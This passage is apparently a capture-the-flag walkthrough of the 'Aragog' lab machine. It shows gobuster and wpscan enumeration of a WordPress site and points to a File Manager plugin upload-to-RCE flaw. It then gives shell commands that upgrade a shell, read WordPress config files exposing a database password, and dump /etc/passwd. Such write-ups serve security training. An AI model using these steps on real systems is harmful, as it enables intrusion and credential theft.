gobuster dir -u http://192.168.43.239/blog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.239/blog/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php,html,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/14 05:24:24 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 301) [Size: 0] [--&gt; http://192.168.43.239/blog/]</span><br><span class="line">/wp-content           (Status: 301) [Size: 326] [--&gt; http://192.168.43.239/blog/wp-content/]</span><br><span class="line">/wp-login.php         (Status: 200) [Size: 3328]                                            </span><br><span class="line">/wp-includes          (Status: 301) [Size: 327] [--&gt; http://192.168.43.239/blog/wp-includes/]</span><br><span class="line">/readme.html          (Status: 200) [Size: 7415]                                             </span><br><span class="line">/wp-trackback.php     (Status: 200) [Size: 135]                                              </span><br><span class="line">/wp-admin             (Status: 301) [Size: 324] [--&gt; http://192.168.43.239/blog/wp-admin/]   </span><br><span class="line">/xmlrpc.php           (Status: 405) [Size: 42]                                               </span><br><span class="line">/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://wordpress.aragog.hogwarts/blog/wp-login.php?action=register]</span><br><span class="line">                                                                                                                      </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/14 05:27:29 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Aragog/2.png" alt></p>
<h3 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h3><p><a href="http://192.168.43.239/blog/" target="_blank" rel="noopener">http://192.168.43.239/blog/</a></p>
<p>配置<code>hosts</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.101 wordpress.aragog.hogwarts</span><br></pre></td></tr></table></figure>

<ul>
<li>发现一些提示</li>
</ul>
<p><img data-src="./Aragog/3.png" alt></p>
<h3 id="wp-scan"><a href="#wp-scan" class="headerlink" title="wp-scan"></a>wp-scan</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordpress.aragog.hogwarts/blog/ --api-token xxxxxxxx --plugins-detection aggressive</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; wpscan --url http://wordpress.aragog.hogwarts/blog/ --api-token xxxxxxxx --plugins-detection aggressive                                                127 ⨯</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.18</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://wordpress.aragog.hogwarts/blog/ [192.168.1.101]</span><br><span class="line">[+] Started: Sun Jan 23 07:52:21 2022</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.38 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://wordpress.aragog.hogwarts/blog/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://wordpress.aragog.hogwarts/blog/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://wordpress.aragog.hogwarts/blog/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-15).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://wordpress.aragog.hogwarts/blog/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.0.12&lt;/generator&gt;</span><br><span class="line"> |  - http://wordpress.aragog.hogwarts/blog/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.0.12&lt;/generator&gt;</span><br><span class="line"> |</span><br><span class="line"> | [!] 6 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer</span><br><span class="line"> |     Fixed in: 5.0.13</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296</span><br><span class="line"> |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62</span><br><span class="line"> |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/</span><br><span class="line"> |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9</span><br><span class="line"> |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/</span><br><span class="line"> |      - https://www.youtube.com/watch?v=HaW15aMzBUM</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress &lt; 5.8 - Plugin Confusion</span><br><span class="line"> |     Fixed in: 5.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223</span><br><span class="line"> |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress &lt; 5.8.3 - SQL Injection via WP_Query</span><br><span class="line"> |     Fixed in: 5.0.15</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661</span><br><span class="line"> |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84</span><br><span class="line"> |      - https://hackerone.com/reports/1378209</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress &lt; 5.8.3 - Author+ Stored XSS via Post Slugs</span><br><span class="line"> |     Fixed in: 5.0.15</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662</span><br><span class="line"> |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w</span><br><span class="line"> |      - https://hackerone.com/reports/425342</span><br><span class="line"> |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query</span><br><span class="line"> |     Fixed in: 5.0.15</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664</span><br><span class="line"> |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress &lt; 5.8.3 - Super Admin Object Injection in Multisites</span><br><span class="line"> |     Fixed in: 5.0.15</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663</span><br><span class="line"> |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h</span><br><span class="line"> |      - https://hackerone.com/reports/541469</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentynineteen</span><br><span class="line"> | Location: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/</span><br><span class="line"> | Last Updated: 2021-07-22T00:00:00.000Z</span><br><span class="line"> | Readme: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.1</span><br><span class="line"> | Style URL: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2</span><br><span class="line"> | Style Name: Twenty Nineteen</span><br><span class="line"> | Style URI: https://github.com/WordPress/twentynineteen</span><br><span class="line"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2, Match: 'Version: 1.2'</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:01:29 &lt;=====================================================================================================================&gt; (96627 / 96627) 100.00% Time: 00:01:29</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] akismet</span><br><span class="line"> | Location: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/akismet/</span><br><span class="line"> | Latest Version: 4.2.1</span><br><span class="line"> | Last Updated: 2021-10-01T18:28:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://wordpress.aragog.hogwarts/blog/wp-content/plugins/akismet/, status: 500</span><br><span class="line"> |</span><br><span class="line"> | [!] 1 vulnerability identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)</span><br><span class="line"> |     Fixed in: 3.1.5</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357</span><br><span class="line"> |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/</span><br><span class="line"> |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] wp-file-manager</span><br><span class="line"> | Location: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/</span><br><span class="line"> | Last Updated: 2021-12-28T09:26:00.000Z</span><br><span class="line"> | Readme: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 7.1.3</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/, status: 200</span><br><span class="line"> |</span><br><span class="line"> | [!] 3 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: File Manager &lt; 6.5 - Backup File Directory Listing</span><br><span class="line"> |     Fixed in: 6.5</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/49533dc2-17cb-459c-af28-69a7b9b9512f</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24312</span><br><span class="line"> |      - https://zeroaptitude.com/zerodetail/wordpress-plugin-bug-hunting-part-1/</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/2326268/wp-file-manager</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE</span><br><span class="line"> |     Fixed in: 6.9</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213</span><br><span class="line"> |      - https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/</span><br><span class="line"> |      - https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/</span><br><span class="line"> |      - https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/</span><br><span class="line"> |      - https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html</span><br><span class="line"> |      - https://twitter.com/w4fz5uck5/status/1298402173554958338</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP File Manager &lt; 7.1 - Reflected Cross-Site Scripting (XSS)</span><br><span class="line"> |     Fixed in: 7.1</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/1cf3d256-cf4b-4d1f-9ed8-e2cc6392d8d8</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24177</span><br><span class="line"> |      - https://n4nj0.github.io/advisories/wordpress-plugin-wp-file-manager-i/</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/2476829/</span><br><span class="line"> |</span><br><span class="line"> | Version: 6.0 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/readme.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;==========================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[+] WPScan DB API OK</span><br><span class="line"> | Plan: free</span><br><span class="line"> | Requests Done (during the scan): 4</span><br><span class="line"> | Requests Remaining: 18</span><br><span class="line"></span><br><span class="line">[+] Finished: Sun Jan 23 07:54:18 2022</span><br><span class="line">[+] Requests Done: 96810</span><br><span class="line">[+] Cached Requests: 9</span><br><span class="line">[+] Data Sent: 28.925 MB</span><br><span class="line">[+] Data Received: 13.245 MB</span><br><span class="line">[+] Memory used: 455.457 MB</span><br><span class="line">[+] Elapsed time: 00:01:56</span><br></pre></td></tr></table></figure>

<ul>
<li>发现漏洞<code>Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE</code></li>
</ul>
<h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p><img data-src="./Aragog/4.png" alt></p>
<p><img data-src="./Aragog/5.png" alt></p>
<p><img data-src="./Aragog/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到一个<code>flag</code></li>
</ul>
<p><img data-src="./Aragog/7.png" alt></p>
<ul>
<li><code>base64</code>解码</li>
</ul>
<p><img data-src="./Aragog/8.png" alt></p>
<ul>
<li>查看<code>wordpress</code>配置文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@Aragog:/usr/share/wordpress$ cat wp-config-sample.php</span><br><span class="line">cat wp-config-sample.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration for WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don't have to use the web site, you can</span><br><span class="line"> * copy this file to "wp-config.php" and fill in the values.</span><br><span class="line"> *</span><br><span class="line"> * This file contains the following configurations:</span><br><span class="line"> *</span><br><span class="line"> * * MySQL settings</span><br><span class="line"> * * Secret keys</span><br><span class="line"> * * Database table prefix</span><br><span class="line"> * * ABSPATH</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="line"> *</span><br><span class="line"> * @package WordPress</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="line">/** The name of the database for WordPress */</span><br><span class="line">define('DB_NAME', 'database_name_here');</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define('DB_USER', 'username_here');</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define('DB_PASSWORD', 'password_here');</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define('DB_HOST', 'localhost');</span><br><span class="line"></span><br><span class="line">/** Database Charset to use in creating database tables. */</span><br><span class="line">define('DB_CHARSET', 'utf8');</span><br><span class="line"></span><br><span class="line">/** The Database Collate type. Don't change this if in doubt. */</span><br><span class="line">define('DB_COLLATE', '');</span><br><span class="line"></span><br><span class="line">/**#@+</span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define('AUTH_KEY',         'put your unique phrase here');</span><br><span class="line">define('SECURE_AUTH_KEY',  'put your unique phrase here');</span><br><span class="line">define('LOGGED_IN_KEY',    'put your unique phrase here');</span><br><span class="line">define('NONCE_KEY',        'put your unique phrase here');</span><br><span class="line">define('AUTH_SALT',        'put your unique phrase here');</span><br><span class="line">define('SECURE_AUTH_SALT', 'put your unique phrase here');</span><br><span class="line">define('LOGGED_IN_SALT',   'put your unique phrase here');</span><br><span class="line">define('NONCE_SALT',       'put your unique phrase here');</span><br><span class="line"></span><br><span class="line">/**#@-*/</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations in one database if you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="meta">$</span><span class="bash">table_prefix  = <span class="string">'wp_'</span>;</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to true to enable the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * in their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used for debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define('WP_DEBUG', false);</span><br><span class="line"></span><br><span class="line">/* That's all, stop editing! Happy blogging. */</span><br><span class="line"></span><br><span class="line">/** Absolute path to the WordPress directory. */</span><br><span class="line">if ( !defined('ABSPATH') )</span><br><span class="line">        define('ABSPATH', dirname(__FILE__) . '/');</span><br><span class="line"></span><br><span class="line">/** Sets up WordPress vars and included files. */</span><br><span class="line">require_once(ABSPATH . 'wp-settings.php');</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#####################################################</span></span></span><br><span class="line"></span><br><span class="line">www-data@Aragog:/usr/share/wordpress$ cat wp-config.php</span><br><span class="line">cat wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/***</span><br><span class="line"> * WordPress's Debianised default master config file</span><br><span class="line"> * Please do NOT edit and learn how the configuration works in</span><br><span class="line"> * /usr/share/doc/wordpress/README.Debian</span><br><span class="line"> ***/</span><br><span class="line"></span><br><span class="line">/* Look up a host-specific config file in</span><br><span class="line"> * /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php</span><br><span class="line"> */</span><br><span class="line"><span class="meta">$</span><span class="bash">debian_server = preg_replace(<span class="string">'/:.*/'</span>, <span class="string">""</span>, <span class="variable">$_SERVER</span>[<span class="string">'HTTP_HOST'</span>]);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">debian_server = preg_replace(<span class="string">"/[^a-zA-Z0-9.\-]/"</span>, <span class="string">""</span>, <span class="variable">$debian_server</span>);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">debian_file = <span class="string">'/etc/wordpress/config-'</span>.strtolower(<span class="variable">$debian_server</span>).<span class="string">'.php'</span>;</span></span><br><span class="line">/* Main site in case of multisite with subdomains */</span><br><span class="line"><span class="meta">$</span><span class="bash">debian_main_server = preg_replace(<span class="string">"/^[^.]*\./"</span>, <span class="string">""</span>, <span class="variable">$debian_server</span>);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">debian_main_file = <span class="string">'/etc/wordpress/config-'</span>.strtolower(<span class="variable">$debian_main_server</span>).<span class="string">'.php'</span>;</span></span><br><span class="line"></span><br><span class="line">if (file_exists($debian_file)) &#123;</span><br><span class="line">    require_once($debian_file);</span><br><span class="line">    define('DEBIAN_FILE', $debian_file);</span><br><span class="line">&#125; elseif (file_exists($debian_main_file)) &#123;</span><br><span class="line">    require_once($debian_main_file);</span><br><span class="line">    define('DEBIAN_FILE', $debian_main_file);</span><br><span class="line">&#125; elseif (file_exists("/etc/wordpress/config-default.php")) &#123;</span><br><span class="line">    require_once("/etc/wordpress/config-default.php");</span><br><span class="line">    define('DEBIAN_FILE', "/etc/wordpress/config-default.php");</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    header("HTTP/1.0 404 Not Found");</span><br><span class="line">    echo "Neither &lt;b&gt;$debian_file&lt;/b&gt; nor &lt;b&gt;$debian_main_file&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.";</span><br><span class="line">    exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Default value for some constants if they have not yet been set</span><br><span class="line">   by the host-specific config files */</span><br><span class="line">if (!defined('ABSPATH'))</span><br><span class="line">    define('ABSPATH', '/usr/share/wordpress/');</span><br><span class="line">if (!defined('WP_CORE_UPDATE'))</span><br><span class="line">    define('WP_CORE_UPDATE', false);</span><br><span class="line">if (!defined('WP_ALLOW_MULTISITE'))</span><br><span class="line">    define('WP_ALLOW_MULTISITE', true);</span><br><span class="line">if (!defined('DB_NAME'))</span><br><span class="line">    define('DB_NAME', 'wordpress');</span><br><span class="line">if (!defined('DB_USER'))</span><br><span class="line">    define('DB_USER', 'wordpress');</span><br><span class="line">if (!defined('DB_HOST'))</span><br><span class="line">    define('DB_HOST', 'localhost');</span><br><span class="line">if (!defined('WP_CONTENT_DIR') &amp;&amp; !defined('DONT_SET_WP_CONTENT_DIR'))</span><br><span class="line">    define('WP_CONTENT_DIR', '/var/lib/wordpress/wp-content');</span><br><span class="line"></span><br><span class="line">/* Default value for the table_prefix variable so that it doesn't need to</span><br><span class="line">   be put in every host-specific config file */</span><br><span class="line">if (!isset($table_prefix)) &#123;</span><br><span class="line">    $table_prefix = 'wp_';</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &amp;&amp; $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')</span><br><span class="line">    $_SERVER['HTTPS'] = 'on';</span><br><span class="line"></span><br><span class="line">require_once(ABSPATH . 'wp-settings.php');</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================================================</span><br><span class="line"></span><br><span class="line">www-data@Aragog:/etc/wordpress$ cat conf</span><br><span class="line">cat config-default.php </span><br><span class="line">&lt;?php</span><br><span class="line">define('DB_NAME', 'wordpress');</span><br><span class="line">define('DB_USER', 'root');</span><br><span class="line">define('DB_PASSWORD', 'mySecr3tPass');</span><br><span class="line">define('DB_HOST', 'localhost');</span><br><span class="line">define('DB_COLLATE', 'utf8_general_ci');</span><br><span class="line">define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>查看用户</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@Aragog:/etc/wordpress$ cat /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">ginny:x:1001:1001::/home/ginny:/bin/sh</span><br><span class="line">hagrid98:x:1000:1000:Hagrid,,,:/home/hagrid98:/bin/bash</span><br></pre></td></tr></table></figure>

<ul>
<li>发现账号密码如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ginny hagrid98 root</span><br><span class="line">mySecr3tPass</span><br></pre></td></tr></table></figure>

<ul>
<li>登录<code>mpsql</code></li>
</ul>
